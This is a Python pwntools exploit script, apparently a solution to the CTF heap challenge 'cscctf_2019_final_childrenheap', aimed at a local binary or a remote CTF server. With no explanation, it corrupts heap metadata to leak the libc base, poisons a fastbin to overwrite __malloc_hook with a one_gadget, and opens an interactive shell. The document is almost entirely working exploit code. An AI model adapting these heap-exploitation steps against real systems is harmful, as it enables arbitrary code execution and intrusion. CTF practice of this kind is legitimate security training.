#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./cscctf_2019_final_childrenheap'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',25902)
			elf=ELF(elfelf)
			libc=ELF('../../x64libc/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			# one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c,b):
			io.sendlineafter('>> ','1')
			io.sendlineafter(': ',str(a))
			io.sendlineafter(': ',str(c))
			io.sendafter(': ',b)

		def edit(a,b):
			io.sendlineafter('>> ','2')
			io.sendlineafter(': ',str(a))
			io.sendafter(': ',b)

		def show(a):
			io.sendlineafter('>> ','3')
			io.sendlineafter(': ',str(a))

		def delete(a):
			io.sendlineafter('>> ','4')
			io.sendlineafter(': ',str(a))

		add(0,0xf8,'aaaa')
		add(1,0x68,'aaaa')
		add(2,0x88,'aaaa')
		add(3,0x88,'aaaa')
		add(4,0x68,'aaaa')
		add(5,0xf8,'aaaa')
		add(6,0xf8,'aaaa')
		edit(4,'a'*0x60+p64(0x300))
		delete(0)
		delete(5)
		add(0,0xf8,'aaaa')
		show(1)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		add(5,0xf8,'aaaa')
		add(7,0xf8,'aaaa')
		add(8,0xf8,'aaaa')
		delete(2)
		edit(5,'a'*0x68+p64(0x91)+p64(0xdeadbeef)+p64(libc_base+3958776-0x10))
		add(2,0x88,'aaaa')
		delete(4)
		edit(7,'a'*0x88+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
		add(4,0x68,'aaaa')
		add(9,0x68,'\x00'*0x13+p64(libc_base+one_gadgaet[2]))
		edit(7,'a'*0x88+p64(0)+p64(libc.sym['__malloc_hook']-0x23))
		delete(4)

		
		
		

		
		success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue